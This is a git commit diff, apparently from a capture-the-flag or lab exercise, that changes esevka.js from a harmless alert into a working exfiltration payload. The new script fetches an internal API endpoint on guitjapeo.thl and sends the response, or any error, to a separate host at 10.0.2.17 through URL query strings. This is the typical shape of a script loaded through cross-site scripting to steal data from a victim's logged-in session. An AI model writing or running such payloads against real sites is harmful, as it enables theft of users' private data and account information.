394a9c49b93509e8c0a84d6a98322adbe86d9b60
EsevKa <139042999+Esevka@users.noreply.github.com>
2025-04-22 11:57:40 +0200

    Update esevka.js

--- esevka.js
+++ esevka.js
@@ -1,2 +1,9 @@
 
-alert("hola");
+fetch("https://guitjapeo.thl/api/info")
+        .then(resp => resp.text())
+        .then(text => {
+            fetch(`http://10.0.2.17/?text=${text}`);
+        })
+        .catch(err => {
+            fetch(`http://10.0.2.17/?err=${err}`);
+        });
